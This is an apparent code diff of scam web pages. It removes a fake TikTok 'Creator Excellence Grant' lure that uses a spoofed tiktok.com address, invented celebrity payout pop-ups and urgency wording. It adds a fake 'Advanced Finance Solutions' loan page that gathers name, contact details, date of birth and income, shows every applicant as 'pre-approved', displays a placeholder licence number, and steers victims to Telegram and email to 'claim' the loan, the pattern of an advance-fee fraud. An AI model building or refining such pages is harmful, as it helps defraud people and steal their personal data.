-              <img src="https://telegram.org/img/t_logo.svg" alt="Telegram" class="contact-icon">
-                            Message on Telegram
-            </a>
-
-            <a href="mailto:tiktokrewardspartners@outlook.com?subject=Claim%20Creator%20Excellence%20Grant&body=Hello%2C%0A%0AI%20received%20notification%20about%20the%20%2420%2C000%20Creator%20Excellence%20Grant%20%28Reference%20ID%3A%20CEP-2024-78492%29.%0A%0APlease%20let%20me%20know%20how%20to%20claim%20my%20reward.%0A%0AName%3A%20diane%0AReference%20ID%3A%20CEP-2024-78492"
-              class="contact-option outlook">
-              <img src="https://img.icons8.com/color/96/000000/microsoft-outlook-2019--v1.png" alt="Outlook" class="contact-icon">
-                            Email via Outlook
-            </a>
+        <form id="loanApplication" onsubmit="submitApplication(event)">
+          <div class="form-row">
+            <div class="form-group">
+              <label>First Name *</label>
+              <input type="text" id="firstName" required placeholder="John">
+            </div>
+            <div class="form-group">
+              <label>Last Name *</label>
+              <input type="text" id="lastName" required placeholder="Doe">
+            </div>
           </div>
 
-          <div class="security-warning">
-            ⚠️ <strong>Security:</strong> Only contact through these official channels. Never share passwords or
-            verification codes.
+          <div class="form-group">
+            <label>Email Address *</label>
+            <input type="email" id="email" required placeholder="john.doe@email.com">
           </div>
 
-          <p class="contact-note">
-            Contact within 24 hours for priority processing!
-          </p>
+          <div class="form-group">
+            <label>Phone Number *</label>
+            <input type="tel" id="phone" required placeholder="(555) 123-4567">
+          </div>
+
+          <div class="form-row">
+            <div class="form-group">
+              <label>Date of Birth *</label>
+              <input type="date" id="dob" required>
+            </div>
+            <div class="form-group">
+              <label>Employment Status *</label>
+              <select id="employment" required>
+                <option value="">Select</option>
+                <option value="employed">Employed Full-time</option>
+                <option value="part-time">Employed Part-time</option>
+                <option value="self-employed">Self-employed</option>
+                <option value="business">Business Owner</option>
+                <option value="retired">Retired</option>
+              </select>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label>Monthly Income *</label>
+            <select id="income" required>
+              <option value="">Select range</option>
+              <option value="0-2000">$0 - $2,000</option>
+              <option value="2001-3000">$2,001 - $3,000</option>
+              <option value="3001-4000">$3,001 - $4,000</option>
+              <option value="4001-5000">$4,001 - $5,000</option>
+              <option value="5001-7000">$5,001 - $7,000</option>
+              <option value="7001+">$7,001+</option>
+            </select>
+          </div>
+
+          <div class="form-row">
+            <div class="form-group">
+              <label>Loan Type *</label>
+              <select id="loanType" required onchange="calculatePayment()">
+                <option value="">Select</option>
+                <option value="business">Business Loan</option>
+                <option value="house">House Loan</option>
+                <option value="hospital">Hospital Loan</option>
+                <option value="school">School Loan</option>
+                <option value="emergency">Emergency Loan</option>
+                <option value="christmas">Christmas Loan</option>
+                <option value="salary">Salary Loan</option>
+                <option value="visa">Visa Loan</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label>Desired Loan Amount ($) *</label>
+              <select id="loanAmount" required onchange="calculatePayment()">
+                <option value="">Select</option>
+                <option value="10000">$10,000</option>
+                <option value="15000">$15,000</option>
+                <option value="20000">$20,000</option>
+                <option value="30000">$30,000</option>
+                <option value="50000">$50,000</option>
+                <option value="100000">$100,000</option>
+                <option value="200000">$200,000</option>
+              </select>
+            </div>
+          </div>
+
+          <div class="loan-calculator" id="calculator" style="display: none;">
+            <p style="font-weight: bold;">Estimated Monthly Payment:</p>
+            <div class="calculator-result">
+              <span id="estimatedPayment">$0</span>/month
+            </div>
+            <p style="font-size: 12px; margin-top: 5px;">*Estimated based on selected amount. Final rate may vary.</p>
+          </div>
+
+          <div class="form-group">
+            <label>Loan Purpose *</label>
+            <textarea id="purpose" rows="3" required placeholder="Briefly describe your loan purpose..."></textarea>
+          </div>
+
+          <div class="form-group">
+            <label>
+              <input type="checkbox" id="agree" required> 
+              I confirm that the information provided is accurate and I agree to the terms & conditions.
+            </label>
+          </div>
+
+          <button type="submit" class="action-btn secondary" id="submitBtn" style="max-width: 100%;">
+            ✓ SUBMIT FOR ELIGIBILITY REVIEW
+          </button>
+        </form>
+
+        <div class="disclaimer">
+          * By submitting this application, you consent to Advanced Finance Solutions, Inc. performing a soft credit check to verify eligibility. This will not affect your credit score.
         </div>
       </div>
 
-      <div class="legal-disclaimer">
-        <strong>Important:</strong><br />
-                • Part of TikTok's Creator Excellence Program<br />
-                • Valid for 30 days<br />
-                • Subject to terms & conditions<br />
-                • No purchase required<br />
-                • TikTok Shop bonus included<br />
-        <a href="#" class="terms-link" onclick="showTerms(event)">Terms & Conditions</a> |
-        <a href="#" class="terms-link" onclick="showPrivacy(event)">Privacy Policy</a>
+      <!-- Grant Review Section (Shows after form submission) -->
+      <div class="grant-review" id="grantReview">
+        <h3 style="color: #003366; font-size: 24px; margin-bottom: 10px;">✅ ELIGIBILITY CONFIRMED!</h3>
+        <p style="font-size: 16px; color: #666;">Congratulations! Based on your application, you qualify for:</p>
+        
+        <div class="grant-amount" id="approvedAmount">$50,000</div>
+        
+        <div class="grant-details">
+          <p><strong>Loan Term:</strong> <span id="loanTerm">36 months</span></p>
+          <p><strong>Monthly Payment:</strong> <span id="monthlyPayment">$2,350</span></p>
+          <p><strong>Interest Rate:</strong> 5.99% APR</p>
+          <p><strong>Application Reference:</strong> <span id="appRef">AFS-12345678</span></p>
+        </div>
+
+        <p style="margin: 15px 0; color: #00a86b; font-weight: bold;">Your loan has been pre-approved pending final verification.</p>
+
+        <!-- Contact Loan Administrator Button -->
+        <button class="action-btn tertiary" onclick="showContactSection()" id="contactAdminBtn">
+          📞 CONTACT LOAN ADMINISTRATOR TO CLAIM
+        </button>
       </div>
 
-      <p style="margin-top: 12px; font-size: 13px;">
-        <strong>📧 Official Contact:</strong><br />
-        <a href="mailto:tiktokrewardspartners@outlook.com"
-          style="color: #FE2C55; text-decoration: none; font-weight: bold;">creator.program@tiktok.com</a><br />
-        <small style="color: #999;">Reference ID: CEP-2024-78492</small>
-      </p>
+      <!-- Contact Section (Shows after clicking contact admin) -->
+      <div class="contact-section" id="contactSection">
+        <p class="contact-header">📞 CONTACT LOAN ADMINISTRATOR</p>
+        <p style="text-align: center; margin-bottom: 20px; color: #003366;">Choose your preferred contact method to claim your loan:</p>
+
+        <div class="contact-options">
+          <!-- Telegram Contact -->
+          <a href="https://t.me/advancedfinancesolutions" 
+             class="contact-option telegram" 
+             target="_blank">
+            <img src="https://telegram.org/img/t_logo.svg" alt="Telegram" class="contact-icon">
+            Claim via Telegram
+          </a>
+
+          <!-- Email with Pre-written Message -->
+          <a href="mailto:loans@advancedfinancesolutions.com?subject=LOAN%20CLAIM%20-%20Pre-approved%20Application&body=Dear%20Advanced%20Finance%20Solutions%20Team%2C%0A%0AI%20have%20completed%20the%20eligibility%20check%20and%20my%20loan%20has%20been%20pre-approved.%20I%20would%20like%20to%20proceed%20with%20claiming%20my%20loan.%0A%0A%E2%96%A0%20Application%20Reference%3A%20[INSERT%20REFERENCE%20NUMBER]%0A%E2%96%A0%20Full%20Name%3A%20______________________________%0A%E2%96%A0%20Approved%20Loan%20Amount%3A%20$__________________%0A%E2%96%A0%20Phone%20Number%3A%20__________________________%0A%0APlease%20provide%20the%20next%20steps%20to%20complete%20the%20loan%20disbursement%20process.%0A%0AThank%20you%20for%20your%20assistance.%0A%0ABest%20regards%2C%0A______________________________"
+             class="contact-option email">
+            <img src="https://cdn-icons-png.flaticon.com/512/732/732200.png" alt="Email" class="contact-icon">
+            Email to Claim Loan
+          </a>
+        </div>
+
+        <div class="security-notice">
+          🔒 <strong>Important Security Notice:</strong><br>
+          • Only use official contact methods listed above<br>
+          • Never share passwords or verification codes<br>
+          • AFS will never ask for your banking password<br>
+          • Verify caller identity before providing information<br>
+          • Keep your application reference number handy
+        </div>
+
+        <p style="margin-top: 15px; font-size: 14px; color: #666; text-align: center;">
+          <strong>Response Time:</strong> Within 1 hour during business hours<br>
+          <strong>Have your application reference ready when contacting us</strong>
+        </p>
+      </div>
+
+      <div style="margin-top: 20px; padding: 15px; background: #e6f2ff; border-radius: 10px; text-align: center;">
+        <p style="color: #003366; font-weight: bold;">⭐ WHY CHOOSE ADVANCED FINANCE SOLUTIONS? ⭐</p>
+        <p style="font-size: 13px; margin-top: 5px;">✓ Same-day approval • ✓ No collateral required • ✓ Flexible repayment • ✓ 100% online process</p>
+      </div>
     </div>
 
     <div class="footer">
-      ©️ 2024 TikTok Inc. All rights reserved.<br />
-            Creator Excellence Program<br />
-      <small>Offer to all TikTok users</small>
+      ©️ 2024 Advanced Finance Solutions, Inc. All rights reserved.<br />
+      NMLS #123456 | Licensed in all 50 states<br />
+      <a href="#">Terms of Use</a> | <a href="#">Privacy Policy</a> | <a href="#">Licensing</a><br />
+      <small>Equal Housing Lender</small>
+      <div style="margin-top: 5px; font-size: 11px; color: #ffaa00;">
+        Sent: <span id="timestamp"></span>
+      </div>
     </div>
   </div>
 
-  <!-- Social Proof Popup -->
-  <div id="social-proof" class="popup hidden"></div>
-
-  <!-- Top Creator Popup -->
-  <div id="top-creator-popup" class="popup hidden"></div>
-
   <script>
-    const messages = [
-            "🎉 Creator just claimed Excellence Grant",
-            "📈 Creator program trending today",
-            "🏆 New Excellence recipient verified",
-            "💰 Grant successfully processed",
-            "⭐ 5-star creator program review",
-            "🔥 Program enrollment up 200%",
-            "✨ Excellence program featured",
-            "📊 Creator satisfaction at 98%",
-            "🛍️ TikTok Shop bonus claimed",
-            "💎 Premium Creator Grant awarded"
-        ];
+    function calculatePayment() {
+      const amount = document.getElementById('loanAmount').value;
+      const calculator = document.getElementById('calculator');
+      const paymentSpan = document.getElementById('estimatedPayment');
+      
+      if (amount) {
+        calculator.style.display = 'block';
+        
+        // Calculate estimated monthly payment based on amount
+        const payments = {
+          '10000': 900,
+          '15000': 1350,
+          '20000': 1800,
+          '30000': 2700,
+          '50000': 2350,
+          '100000': 3150,
+          '200000': 6300
+        };
+        
+        paymentSpan.textContent = '$' + (payments[amount] || '0');
+      } else {
+        calculator.style.display = 'none';
+      }
+    }
 
-        const creatorMessages = [
-            { name: "Charli D'Amelio", amount: "$750,000", message: "received Excellence Grant of" },
-            { name: "Khaby Lame", amount: "$1,000,000", message: "earned grant of" },
-            { name: "Bella Poarch", amount: "$850,000", message: "was awarded" },
-            { name: "Addison Rae", amount: "$950,000", message: "received" },
-            { name: "Zach King", amount: "$600,000", message: "earned" },
-            { name: "Spencer X", amount: "$450,000", message: "received grant of" },
-            { name: "Dixie D'Amelio", amount: "$700,000", message: "was awarded" },
-            { name: "Michael Le", amount: "$550,000", message: "earned" },
-            { name: "Avani Gregg", amount: "$500,000", message: "received" },
-            { name: "James Charles", amount: "$800,000", message: "was awarded" }
-        ];
+    function showApplication() {
+      const applicationForm = document.getElementById('applicationForm');
+      const eligibilityBtn = document.getElementById('eligibilityBtn');
+      
+      // Hide the eligibility button
+      eligibilityBtn.style.display = 'none';
+      
+      // Show the application form with animation
+      applicationForm.style.display = 'block';
+      applicationForm.scrollIntoView({ behavior: 'smooth' });
+    }
 
-        const popup = document.getElementById("social-proof");
-        const topCreatorPopup = document.getElementById("top-creator-popup");
+    function submitApplication(event) {
+      event.preventDefault();
+      
+      // Validate form
+      if (!document.getElementById('agree').checked) {
+        alert('Please agree to the terms to continue.');
+        return;
+      }
 
-        function showPopup() {
-            const message = messages[Math.floor(Math.random() * messages.length)];
-            popup.textContent = message;
-            popup.classList.remove("creator-popup");
-            popup.classList.remove("hidden");
-            popup.classList.add("visible");
+      // Get form values
+      const firstName = document.getElementById('firstName').value;
+      const lastName = document.getElementById('lastName').value;
+      const loanAmount = document.getElementById('loanAmount').value;
+      const loanType = document.getElementById('loanType').value;
+      
+      // Generate application reference
+      const ref = 'AFS-' + Date.now().toString().slice(-8) + '-' + Math.floor(Math.random() * 1000);
+      
+      // Determine loan term based on amount
+      let term = '12 months';
+      let monthlyPayment = '$0';
+      
+      const paymentMap = {
+        '10000': { payment: '$900', term: '12 months' },
+        '15000': { payment: '$1,350', term: '12 months' },
+        '20000': { payment: '$1,800', term: '12 months' },
+        '30000': { payment: '$2,700', term: '12 months' },
+        '50000': { payment: '$2,350', term: '24 months' },
+        '100000': { payment: '$3,150', term: '36 months' },
+        '200000': { payment: '$6,300', term: '36 months' }
+      };
+      
+      if (paymentMap[loanAmount]) {
+        monthlyPayment = paymentMap[loanAmount].payment;
+        term = paymentMap[loanAmount].term;
+      }
+      
+      // Format loan amount for display
+      const formattedAmount = '$' + parseInt(loanAmount).toLocaleString();
+      
+      // Update grant review section
+      document.getElementById('approvedAmount').textContent = formattedAmount;
+      document.getElementById('loanTerm').textContent = term;
+      document.getElementById('monthlyPayment').textContent = monthlyPayment;
+      document.getElementById('appRef').textContent = ref;
+      
+      // Hide application form, show grant review
+      document.getElementById('applicationForm').style.display = 'none';
+      document.getElementById('grantReview').style.display = 'block';
+      
+      // Scroll to grant review
+      document.getElementById('grantReview').scrollIntoView({ behavior: 'smooth' });
+    }
 
-            popup.style.animation = 'none';
-            setTimeout(() => {
-                popup.style.animation = '';
-            }, 10);
+    function showContactSection() {
+      const contactSection = document.getElementById('contactSection');
+      
+      // Show contact section
+      contactSection.style.display = 'block';
+      
+      // Scroll to contact section
+      contactSection.scrollIntoView({ behavior: 'smooth' });
+    }
 
-            setTimeout(() => {
-                popup.classList.remove("visible");
-                popup.classList.add("hidden");
-            }, 4000);
-        }
+    // Initialize on page load
+    document.addEventListener('DOMContentLoaded', function() {
+      // Set timestamp
+      const now = new Date();
+      const timestamp = document.getElementById('timestamp');
+      timestamp.textContent = now.toLocaleDateString() + ' ' + now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
 
-        function showCreatorPopup() {
-            const creator = creatorMessages[Math.floor(Math.random() * creatorMessages.length)];
-            topCreatorPopup.innerHTML = `
-                <div class="creator-name">${creator.name}</div>
-                <div>${creator.message}</div>
-                <div class="reward-amount">${creator.amount}! 🎉</div>
-            `;
-            
-            topCreatorPopup.classList.remove("hidden");
-            topCreatorPopup.classList.add("visible");
+      // Add input validation for phone
+      document.getElementById('phone').addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^0-9+()-]/g, '');
+      });
 
-            topCreatorPopup.style.animation = 'none';
-            setTimeout(() => {
-                topCreatorPopup.style.animation = '';
-            }, 10);
-
-            setTimeout(() => {
-                topCreatorPopup.classList.remove("visible");
-                topCreatorPopup.classList.add("hidden");
-            }, 5000);
-        }
-
-        setInterval(showPopup, 12000);
-        setInterval(showCreatorPopup, 18000);
-        setTimeout(showPopup, 3000);
-        setTimeout(showCreatorPopup, 8000);
-
-        function revealReward() {
-            const reward = document.getElementById('rewardText');
-            const viewBtn = document.getElementById('viewRewardBtn');
-            const claimBtn = document.getElementById('claimRewardBtn');
-            const viewSpinner = document.getElementById('viewSpinner');
-            
-            viewSpinner.style.display = 'inline-block';
-            viewBtn.disabled = true;
-            viewBtn.innerHTML = 'Loading Reward... <span class="loading-spinner"></span>';
-
-            setTimeout(() => {
-                reward.style.display = 'block';
-                launchConfetti();
-                viewBtn.style.display = 'none';
-                claimBtn.style.display = 'inline-block';
-                
-                setTimeout(() => {
-                    showPopup();
-                    setTimeout(() => {
-                        showCreatorPopup();
-                    }, 2000);
-                }, 1000);
-            }, 1500);
-        }
-
-        function revealContactLinks() {
-            const claimBtn = document.getElementById('claimRewardBtn');
-            const contactLinks = document.getElementById('contactLinks');
-            const claimSpinner = document.getElementById('claimSpinner');
-            
-            claimSpinner.style.display = 'inline-block';
-            claimBtn.disabled = true;
-            claimBtn.innerHTML = 'Preparing Contacts... <span class="loading-spinner"></span>';
-
-            setTimeout(() => {
-                claimBtn.style.display = 'none';
-                contactLinks.style.display = 'block';
-                launchConfetti();
-                
-                setTimeout(() => {
-                    showPopup();
-                    setTimeout(() => {
-                        showCreatorPopup();
-                    }, 2000);
-                }, 1000);
-            }, 1500);
-        }
-
-        function showTerms(event) {
-            if (event) event.preventDefault();
-            const popup = document.getElementById('social-proof');
-            popup.textContent = '📋 Opening terms & conditions...';
-            popup.classList.add('creator-popup');
-            popup.classList.remove('hidden');
-            popup.classList.add('visible');
-            
-            setTimeout(() => {
-                popup.classList.remove('visible');
-                popup.classList.add('hidden');
-            }, 3000);
-        }
-
-        function showPrivacy(event) {
-            if (event) event.preventDefault();
-            const popup = document.getElementById('social-proof');
-            popup.textContent = '🔒 Loading privacy policy...';
-            popup.classList.add('creator-popup');
-            popup.classList.remove('hidden');
-            popup.classList.add('visible');
-            
-            setTimeout(() => {
-                popup.classList.remove('visible');
-                popup.classList.add('hidden');
-            }, 3000);
-        }
-
-        function launchConfetti() {
-            const canvas = document.querySelector('.confetti');
-            const confetti = canvas.getContext('2d');
-            canvas.width = canvas.offsetWidth;
-            canvas.height = canvas.offsetHeight;
-
-            const colors = ['#FE2C55', '#25F4EE', '#FFD700', '#FF69B4', '#00CED1'];
-            let particles = Array.from({ length: 100 }, () => ({
-                x: Math.random() * canvas.width,
-                y: Math.random() * -canvas.height,
-                speed: Math.random() * 3 + 2,
-                radius: Math.random() * 6 + 2,
-                color: colors[Math.floor(Math.random() * colors.length)],
-                rotation: Math.random() * 360,
-                rotationSpeed: (Math.random() - 0.5) * 10
-            }));
-
-            function draw() {
-                confetti.clearRect(0, 0, canvas.width, canvas.height);
-                for (let p of particles) {
-                    confetti.save();
-                    confetti.translate(p.x, p.y);
-                    confetti.rotate(p.rotation * Math.PI / 180);
-                    confetti.fillStyle = p.color;
-                    confetti.fillRect(-p.radius/2, -p.radius/2, p.radius, p.radius);
-                    confetti.restore();
-
-                    p.y += p.speed;
-                    p.rotation += p.rotationSpeed;
-                    if (p.y > canvas.height) {
-                        p.y = -10;
-                        p.x = Math.random() * canvas.width;
-                    }
-                }
-                requestAnimationFrame(draw);
-            }
-
-            draw();
-
-            setTimeout(() => {
-                particles = [];
-            }, 8000);
-        }
-
-        function addTimestamp() {
-            const timestamp = document.createElement('div');
-            timestamp.style.cssText = 'font-size: 9px; color: #999; margin-top: 6px;';
-            timestamp.innerHTML = `Sent: ${new Date().toLocaleString('en-US', { 
-                weekday: 'short',
-                year: 'numeric',
-                month: 'short',
-                day: 'numeric',
-                hour: '2-digit',
-                minute: '2-digit',
-                timeZoneName: 'short'
-            })}`;
-            
-            document.querySelector('.footer').appendChild(timestamp);
-        }
-
-        addTimestamp();
-
-        document.querySelectorAll('a[href^="mailto"]').forEach(link => {
-            link.addEventListener('mouseenter', function() {
-                this.style.transform = 'scale(1.05)';
-            });
-            link.addEventListener('mouseleave', function() {
-                this.style.transform = 'scale(1)';
-            });
+      // Touch support for mobile
+      document.querySelectorAll('button, .loan-type, .contact-option').forEach(btn => {
+        btn.style.touchAction = 'manipulation';
+        btn.addEventListener('touchstart', function() {
+          this.style.opacity = '0.8';
         });
+        btn.addEventListener('touchend', function() {
+          this.style.opacity = '1';
+        });
+      });
+
+      // Set minimum date for DOB (18 years ago)
+      const today = new Date();
+      const minDate = new Date(today.setFullYear(today.getFullYear() - 18));
+      document.getElementById('dob').max = minDate.toISOString().split('T')[0];
+    });
   </script>
 </body>
-
 </html>
